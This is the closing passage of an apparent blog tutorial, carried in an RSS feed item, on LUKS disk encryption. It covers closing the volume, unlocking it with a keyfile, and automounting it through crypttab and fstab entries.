<li>If you want to unmount and remove the harddisk. You’ll have to follow the steps:</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">umount /mountpoints/sdb cryptsetup luksClose myencrypt
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*6JplORU1iMFii5fwR4Reqg.png" alt=""  />

<img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*TZ8IkBpyRwkufkvyPkIT2g.png" alt=""  />
</p>
<ol start="2">
<li>If you want to open the luks partition with keyfile instead of the passphrase.</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup -v luksOpen /dev/sdb1 myencrypt --key-file=/etc/luks-keys/mybackup\_key
</span></span></code></pre></div><ol start="3">
<li>What if someone changes the content of the keyfile?</li>
</ol>
<p>Creating a new key</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*SuPXbF7MvbIufvP8qAikTw.png" alt=""  />
</p>
<p>Add the key to the slots</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*gJ41bDkh1J5UyNGIQjZJww.png" alt=""  />
</p>
<p>Use key</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*bykTB3_3rLa3w5AODyKA-w.png" alt=""  />
</p>
<p>So the content inside the keyfile do matter; You can’t change it and expect things to work just fine for you.</p>
<h3 id="time-for-some-automation">Time for some Automation</h3>
<p>Get the UUID of the encrypted partition</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*wasZr_6cKCRIibLohoPJvQ.png" alt=""  />
</p>
<p>And make the below entry in <code>/etc/crypttab</code> file. (Check the UUID for your device - Don&rsquo;t copy mine!!)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">myencrypt    UUID=48a20857-6f26-4352-89d5-e778f2d98950     /etc/luks-keys/mybackup\_key    luks
</span></span></code></pre></div><p>The above line is a combination of 4 fields:</p>
<ul>
<li>name of the mapped device.</li>
<li>uuid of the encrypted partition</li>
<li>keyfile to unlock the partiotion</li>
<li>type of encryption used — luks</li>
</ul>
<p>And then make below entry in <code>/etc/fstab</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/dev/mapper/myencrypt /mountpoints/sdb xfs defaults 0 0
</span></span></code></pre></div><p><em>Want to learn more about</em> <a href="https://linux.die.net/man/5/crypttab"><em>crypttab</em></a> <em>and</em> <a href="https://linux.die.net/man/5/fstab"><em>fstab</em></a></p>
<p>Last step to verify if the above steps worked fine or not.</p>
<ul>
<li>Remount and verify (using mount command with &lsquo;a&rsquo; and &lsquo;v&rsquo; flags for clarity)</li>
<li>Reboot the system and check if everything works after reboot. (Trust me, things betray sometimes after reboot)</li>
</ul>
<hr>
<p>Want to <a href="https://wiki.archlinux.org/index.php/Dm-crypt/Device_encryption">read more</a> about dm-crypt or device encryption?</p>
<hr>
<p><img loading="lazy" src="https://miro.medium.com/max/480/0*IZmFYignS8jVnoSE.gif" alt=""  />
</p>]]></content:encoded>
    </item>
    
  </channel>
</rss>
